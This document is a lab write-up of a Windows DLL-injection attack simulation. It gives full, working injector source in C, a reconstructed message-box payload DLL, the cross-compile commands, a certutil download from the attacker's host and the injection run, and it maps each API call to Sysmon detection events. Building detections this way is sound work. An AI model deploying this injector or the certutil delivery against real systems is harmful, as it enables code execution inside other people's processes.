# 02 — Attack Simulation

## 0. Pre-flight (victim) — pick a target process

As logged-on user `bryll`, launch a benign process and record its PID:

```powershell
PS C:\Users\bryll> notepad.exe
PS C:\Users\bryll> timeout /t 1
PS C:\Users\bryll> tasklist /fi "imagename eq notepad.exe"

Image Name         PID Session Name  Session#  Mem Usage
================ ====== ============  ========  =========
notepad.exe       2052 Console              1     15,976 K
```

→ `evidence/01-win-target-process.png`. Target PID = **2052** (`C:\Windows\System32\notepad.exe`).

## 1. Build the injector on Kali (attacker, `butch` @ 192.168.100.107)

Source `injector.c` (full source — captured in `evidence/kali-injector.c-exe-payload.png`):

```c
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    if (argc < 3) {
        printf("usage: %s <PID> <dllpath>\n", argv[0]);
        return 1;
    }

    DWORD pid = (DWORD)atoi(argv[1]);
    const char* dllPath = argv[2];

    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);
    if (!hProcess) { printf("OpenProcess failed: %lu\n", GetLastError()); return 1; }

    SIZE_T pathLen = strlen(dllPath) + 1;
    LPVOID pRemoteBuf = VirtualAllocEx(hProcess, NULL, pathLen,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteBuf) { printf("VirtualAllocEx failed: %lu\n", GetLastError()); CloseHandle(hProcess); return 1; }

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)dllPath, pathLen, &bytesWritten)
        || bytesWritten != pathLen) {
        printf("WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE); CloseHandle(hProcess); return 1;
    }

    LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)
        GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!pLoadLibrary) { printf("Failed to resolve LoadLibraryA: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE); CloseHandle(hProcess); return 1; }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary, pRemoteBuf, 0, NULL);
    if (!hThread) { printf("CreateRemoteThread failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE); CloseHandle(hProcess); return 1; }

    printf("Successfully injected! Waiting for thread completion...\n");
    WaitForSingleObject(hThread, 5000);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
```

The four WinAPI calls map directly to detection points:

| Call | Purpose | Sysmon signal |
|---|---|---|
| `OpenProcess` (0x1F0FFF-equivalent rights) | Get handle to target | **EID 10 (ProcessAccess)** — not captured this run |
| `VirtualAllocEx` | Allocate RW memory in target | (no direct Sysmon event) |
| `WriteProcessMemory` | Write DLL path into target | (no direct Sysmon event) |
| `CreateRemoteThread(LoadLibraryA)` | Force target to load the DLL | **EID 8 (CreateRemoteThread)** — captured, smoking gun |

Cross-compile (64-bit, matching the 64-bit target):

```bash
butch@butch:~$ x86_64-w64-mingw32-gcc -o injector.exe injector.c
butch@butch:~$ ls -la injector.exe
-rwxrwxr-x 1 butch butch 270465 Nov 13 07:48 injector.exe
```

→ `evidence/02-kali-malicious-exe-built.png`. Size **270465 bytes**.

## 2. Payload DLL (`inject.dll`)

**Honesty note:** `inject.dll` source/build/hash were **not captured** in the screenshots. Its behavior is proven by the observed popup. The following minimal DLL **reproduces the observed popup exactly** and is included as an illustrative reconstruction:

```c
// inject.c — illustrative reconstruction (actual source not captured)
#include <windows.h>
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        MessageBoxA(NULL, "Injected into remote process - code exec",
                    "PWNED", MB_OK | MB_ICONINFORMATION);
    }
    return TRUE;
}
// build: x86_64-w64-mingw32-gcc -shared -o inject.dll inject.c
```

On `DLL_PROCESS_ATTACH` (triggered when `LoadLibraryA` runs in the remote thread), it pops: title **"PWNED"**, body **"Injected into remote process - code exec"**.

## 3. Serve + deliver to victim

On Kali: `python3 -m http.server 80` (serving `injector.exe` + `inject.dll`).

On victim (PowerShell as `bryll`), LOLBin download — **captured**:

```powershell
PS C:\Users\bryll> certutil -urlcache -split -f http://192.168.100.107/injector.exe C:\Users\Public\injector.exe
****  Online  ****
000000 ...
004081 ...
042081 ...
CertUtil: -URLCache command completed successfully.
```

→ `evidence/04-win-injection-popup.png` (top half). **Not captured:** the equivalent `certutil` (or other) delivery of `inject.dll` to `C:\Users\Public\inject.dll` — it was present at execution time.

## 4. Execute the injection

```powershell
PS C:\Users\bryll> C:\Users\Public\injector.exe 2052 C:\Users\Public\inject.dll
Successfully injected! Waiting for thread completion...
```

Immediately, a MessageBox owned by `notepad.exe` appears: **"PWNED" / "Injected into remote process - code exec"** — proof that `inject.dll` loaded and executed inside `notepad.exe` (PID 2052).

→ `evidence/04-win-injection-popup.png` (bottom half: injector stdout + popup).

## 5. Result

- `injector.exe` (PID **3128**) opened `notepad.exe` (PID **2052**), wrote the string `C:\Users\Public\inject.dll` into its memory, and started a remote thread at `KERNEL32.DLL!LoadLibraryA` (NewThreadId **912**).
- `notepad.exe` loaded `inject.dll`; `DllMain` ran; popup fired.
- Sysmon EID 8 logged at `2026-11-13 12:49:57.225 UTC` (eventRecordID **12279**). → `evidence/wazuh-sysmon8-expanded.png`.

Kali-side commands: `kali-commands.txt`.
